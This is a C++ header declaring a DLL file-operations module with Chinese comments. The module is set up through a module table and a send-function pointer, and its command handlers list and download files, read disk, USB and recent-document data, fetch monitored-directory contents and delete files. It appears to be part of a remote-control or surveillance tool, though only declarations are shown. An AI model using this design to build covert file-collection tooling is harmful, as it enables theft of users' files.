// FileWork.h: interface for the FileWork class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_FILEWORK_H__6F9126B3_5551_4B87_B9E8_F3DB95C8A385__INCLUDED_)
#define AFX_FILEWORK_H__6F9126B3_5551_4B87_B9E8_F3DB95C8A385__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000
#include "FilePublicFun.h"

#define BLOCK_FIRST	1
#define BLOCK_TRANS	2
#define BLOCK_LAST	4
#define BLOCK_ALL	BLOCK_FIRST|BLOCK_TRANS|BLOCK_LAST

// #define		VER_WIN98	0
// #define		VER_WIN2K	1
// #define		VER_WINXP	2
// #define		VER_WIN2K3	3
// #define     VER_Vista32 4
// #define     VER_Vista64 5
// #define		VER_Windows7 6
// #define		VER_Windows8 7

#pragma warning(disable : 4786)

#include <vector>
using namespace std;

//DLL导出函数
int partInitFileOpt(DWORD* pModuleTable, int TableSize, DWORD pSendFunction);

/*************************命令调用函数*********************/
/*!
  \fn DWORD StartPathList(DWORD* pPara);
  \brief 文件列表
  \param 
  \param 
  \return
  函数详细
*/
DWORD StartPathList(DWORD* pPara);
/*!
  \fn DWORD StartFileCopy(DWORD* pPara);
  \brief 下载文件
  \param 
  \param 
  \return
  函数详细
*/
DWORD StartFileCopy(DWORD* pPara);
/*!
  \fn DWORD StartGetDiskInfo(DWORD* pPara);
  \brief 获得磁盘信息
  \param 
  \param 
  \return
  函数详细
*/
DWORD StartGetDiskInfo(DWORD* pPara);

/*!
  \fn DWORD StartRecentPathList(DWORD* pPara);
  \brief 最近文档列表
  \param 
  \param 
  \return
  函数详细
*/
DWORD StartRecentPathList(DWORD* pPara);
/*!
  \fn DWORD StartPathStructList(DWORD* pPara);
  \brief 获取磁盘结构列表
  \param 
  \param 
  \return
  函数详细
*/
DWORD StartPathStructList(DWORD* pPara);
/*!
  \fn DWORD StartSearchDir(DWORD*	pPara);
  \brief 监视线程
  \param 
  \param 
  \return
  函数详细
*/
//DWORD StartSearchDir(DWORD*	pPara);
/*!
  \fn DWORD StartGetUsbDiskInfo(DWORD* pPara);
  \brief 获得u盘信息
  \param 
  \param 
  \return
  函数详细
*/
DWORD StartGetUsbDiskInfo(DWORD* pPara);
/*!
  \fn DWORD StartReGetFile(DWORD* ppara);
  \brief //重传文件,根据文件偏移发送数据包
  \param 
  \param 
  \return
  函数详细
*/
DWORD StartReGetFile(DWORD* ppara); 

/*!
  \fn DWORD StartQueryFile(DWORD* ppara); 
  \brief //查询文件是否存和大小
  \param 
  \param 
  \return
  函数详细
*/
DWORD StartQueryFile(DWORD* ppara); 

/*!
  \fn DWORD StartGetMonitorList(DWORD* ppara); 
  \brief //取监控目录列表内容
  \param 
  \param 
  \return
  函数详细
*/
DWORD StartGetMonitorList(DWORD* ppara); 
/*!
  \fn int ReadFileOptFile(WCHAR* filename,DWORD& pbuffer,DWORD& datalen,char* monitortype,char* monitorvalue);
  \brief //取指定文件的内容,如果为空再返回错误头
  \param 
  \param 
  \return
  函数详细
*/
int ReadFileOptFile(char * filename,DWORD& pbuffer,DWORD& datalen,char* monitortype,char* monitorvalue);

//目录结构写内存
extern BOOL GetPathStruct(WCHAR * p,char ** structbuff,int & contentlength,int & structbufflen);

//extern int LineParser(char * inputline,char ** nextline,char **field,char ** value);
extern BOOL GetFileList(const WCHAR *root, DIRLIST& filelist, const WCHAR *fType, int level);

DWORD AckDeleteFile(DWORD* pPara);

#endif // !defined(AFX_FILEWORK_H__6F9126B3_5551_4B87_B9E8_F3DB95C8A385__INCLUDED_)

